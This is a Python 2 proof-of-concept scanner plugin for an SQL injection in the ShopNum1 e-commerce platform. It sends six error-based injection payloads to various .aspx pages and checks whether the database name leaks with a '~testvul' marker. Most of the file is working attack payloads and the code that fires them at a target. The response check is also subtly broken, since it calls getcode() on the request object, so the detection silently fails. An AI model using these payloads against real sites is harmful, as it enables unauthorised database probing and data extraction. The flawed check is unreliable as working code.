# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib2

class Vuln(ABVuln):
    vuln_id = 'ShopNum1_0001' # 平台漏洞编号，留空
    name = 'ShopNum1 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-06-22'  # 漏洞公布时间
    desc = '''
        ShopNum1 过滤不严格导致高危SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'ShopNum1'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '3bd9b8ad-81e8-42fe-99c6-99ce07dc995e'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
        
            #__Refer___ = http://www.wooyun.org/bugs/wooyun-2015-0121337    
            payloads = [
                '/VideoDetail.aspx?Guid=111%27%20and%20(db_name()%2BCHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(118)%2BCHAR(117)%2BCHAR(108))>0--',
                '/VideoSearchList.aspx?VideoCategoryID=1%20and%20(db_name()%2BCHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(118)%2BCHAR(117)%2BCHAR(108))%3E0--',
                '/ProductListCategory.aspx?ProductCategoryID=1%20and%20(db_name()%2BCHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(118)%2BCHAR(117)%2BCHAR(108))%3E0--',
                '/ArticleDetail.aspx?guid=1%27%20and%20(db_name()%2BCHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(118)%2BCHAR(117)%2BCHAR(108))>0--',
                '/ArticleDetailNew.aspx?guid=1%27%20and%20(db_name()%2BCHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(118)%2BCHAR(117)%2BCHAR(108))>0--',
                '/HelpList.aspx?Guid=1%27%20and%20(db_name()%2BCHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(118)%2BCHAR(117)%2BCHAR(108))>0--'
            ]
            for payload in payloads:
                verify_url = self.target + payload
                req = urllib2.Request(verify_url)
                content = urllib2.urlopen(req).read()
                
                if req.getcode() == 200 and "~testvul" in content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
